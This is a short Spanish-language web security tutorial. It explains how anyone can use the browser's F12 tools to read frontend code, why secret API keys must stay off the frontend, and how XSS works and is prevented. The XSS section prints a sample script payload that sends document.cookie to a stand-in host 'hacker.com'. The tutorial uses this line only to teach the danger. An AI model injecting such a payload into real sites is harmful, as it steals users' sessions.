# 🔍 Seguridad en la Web: La Prueba F12, XSS y Cero Fugas

> *"Cualquier archivo o texto que viaje hacia el navegador del usuario se descarga físicamente en su disco duro. Por definición, todo lo que llega al frontend es 100% PÚBLICO."*

---

## 💻 1. La Prueba Inquebrantable de la Tecla F12

Abre cualquier navegador web (Chrome, Firefox, Edge o Brave) y presiona la tecla **F12** (o clic derecho -> *Inspeccionar*).

En ese instante accedes a las **DevTools (Herramientas de Desarrollador)**:
1. **Pestaña Elements / Elementos:** Ves el HTML exacto de la página. Puedes cambiar textos, borrar botones o cambiar precios directamente en tu pantalla.
2. **Pestaña Sources / Fuentes:** Puedes leer cada línea de código JavaScript que el desarrollador escribió, ver los nombres de las variables y buscar palabras clave.
3. **Pestaña Network / Red:** Ves cada petición HTTP que sale de tu navegador: la URL exacta, los datos enviados y la respuesta completa del servidor con cada campo y valor.

> [!CAUTION]
> Si tu código JavaScript contiene una clave como `STRIPE_SECRET_KEY = "sk_live_..."` o `SUPABASE_SERVICE_ROLE_KEY = "..."`, **cualquier persona del mundo puede copiarla en 5 segundos con solo presionar F12**, vaciar tus cuentas o borrar toda tu base de datos.

---

## 🗝️ Las Dos Claves: Públicas vs. Secretas

Cuando integras servicios en la nube (como Supabase, Firebase, OpenAI o Stripe), siempre te entregarán dos llaves distintas:

| Tipo de Llave | ¿Dónde se puede usar? | ¿Qué permisos tiene? | Ejemplo Típico |
|---|---|---|---|
| **Llave Pública (Anon / Publishable)** | ✅ En el Frontend (HTML / JS) | Muy limitados. Solo puede hacer lo que las reglas de seguridad le permitan. | `anon_key`, `pk_live_...` |
| **Llave Secreta (Service Role / Secret)** | ⛔ NUNCA en el Frontend. SOLO en tu Backend privado | Permisos totales (Dios). Puede saltarse todas las reglas y borrar datos. | `service_role_key`, `sk_live_...` |

---

## 💉 2. ¿Qué es XSS (Cross-Site Scripting)?

Imagina que tienes una aplicación donde los usuarios pueden dejar comentarios:
- Un usuario normal escribe: *"¡Excelente servicio!"*.
- Un usuario malicioso escribe:  
  `<script>fetch('https://hacker.com/robar?cookie=' + document.cookie)</script>`

Si tu código toma ese texto y lo inyecta directamente usando `elemento.innerHTML = comentario`:
- El navegador cree que es código legítimo y lo ejecuta.
- El script malicioso roba la sesión de cualquier otra persona que entre a leer los comentarios.

### 🛡️ Cómo Protegerse:
Nunca uses `innerHTML` para pintar texto introducido por usuarios. Usa siempre `elemento.textContent = comentario` o deja que librerías modernas se encarguen de sanitizar y escapar el texto automáticamente.
